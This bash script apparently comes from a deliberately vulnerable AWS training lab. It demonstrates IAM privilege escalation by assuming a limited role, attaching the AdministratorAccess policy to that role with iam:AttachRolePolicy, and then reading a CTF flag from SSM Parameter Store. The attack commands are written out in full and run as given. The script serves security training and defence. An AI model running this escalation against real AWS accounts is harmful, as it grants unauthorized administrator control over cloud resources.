#!/bin/bash

# Demo script for iam:AttachRolePolicy privilege escalation
# This is a ROLE-BASED self-escalation scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-009-to-admin-starting-user"
STARTING_ROLE="pl-prod-iam-009-to-admin-starting-role"
MANAGED_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AttachRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based Self-Escalation${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_admin_iam_009_iam_attachrolepolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify identity as user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# [EXPLOIT] Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $ROLE_ARN"

show_cmd "Attacker" "aws sts assume-role --role-arn \"$ROLE_ARN\" --role-session-name \"arp-demo-session\""
ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$ROLE_ARN" \
    --role-session-name "arp-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# [EXPLOIT] Step 4: Test current permissions (should be limited)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 2>&1 | grep -q "AccessDenied\|not authorized"; then
    echo -e "${GREEN}✓ Confirmed limited permissions${NC}\n"
else
    echo -e "${YELLOW}⚠ Warning: Unexpected permissions${NC}\n"
fi

# [EXPLOIT] Step 5: Perform privilege escalation via AttachRolePolicy
echo -e "${YELLOW}Step 5: Escalating privileges via iam:AttachRolePolicy${NC}"
echo "Attaching AdministratorAccess managed policy to self..."

show_attack_cmd "Attacker" "aws iam attach-role-policy --role-name \"$STARTING_ROLE\" --policy-arn \"$MANAGED_POLICY_ARN\""
aws iam attach-role-policy \
    --role-name "$STARTING_ROLE" \
    --policy-arn "$MANAGED_POLICY_ARN"

echo -e "${GREEN}✓ Successfully attached AdministratorAccess policy to self!${NC}\n"

# Wait for policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
sleep 15
echo ""

# [OBSERVATION] Step 6: Verify admin access
echo -e "${YELLOW}Step 6: Verifying administrator access${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
echo "Checking if AdministratorAccess is now attached to the starting role..."
show_cmd "ReadOnly" "aws iam list-attached-role-policies --role-name \"$STARTING_ROLE\" --query 'AttachedPolicies[*].PolicyArn' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-role-policies \
    --role-name "$STARTING_ROLE" \
    --query 'AttachedPolicies[*].PolicyArn' \
    --output text 2>/dev/null)

if echo "$ATTACHED_POLICIES" | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_ROLE${NC}"
else
    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_ROLE${NC}"
    exit 1
fi
echo ""
echo "Attempting to list IAM users..."
show_cmd "ReadOnly" "aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text"
IAM_USERS=$(aws iam list-users --max-items 5 --query 'Users[*].UserName' --output text)
echo -e "${GREEN}✓ Successfully listed IAM users: $IAM_USERS${NC}"

echo -e "${GREEN}✓ Confirmed administrator access!${NC}\n"

# [EXPLOIT] Step 7: Capture the CTF flag
# The starting role now has AdministratorAccess attached, which grants ssm:GetParameter
# implicitly. Re-assume the role with the escalated session, or simply switch to the
# role credentials already in the environment (they reflect the newly attached policy).
use_starting_creds
echo -e "${YELLOW}Step 7: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/iam-009-to-admin"

# Re-assume the role to pick up the freshly attached AdministratorAccess policy
ASSUME_ROLE_OUTPUT2=$(aws sts assume-role \
    --role-arn "$ROLE_ARN" \
    --role-session-name "arp-flag-session")
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT2" | jq -r '.Credentials.SessionToken')

show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)

if [ -z "$FLAG_VALUE" ] || [ "$FLAG_VALUE" = "None" ]; then
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}\n"

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:AttachRolePolicy${NC} to attach AdministratorAccess to self"
echo -e "Step 3: Re-assumed role to pick up escalated permissions"
echo -e "Step 4: Captured CTF flag from SSM Parameter Store: ${GREEN}$FLAG_VALUE${NC}"
echo -e "Result: ${GREEN}Administrator Access + CTF Flag${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (AttachRolePolicy on self) → Admin → (ssm:GetParameter) → CTF Flag"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the AdministratorAccess policy${NC}"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
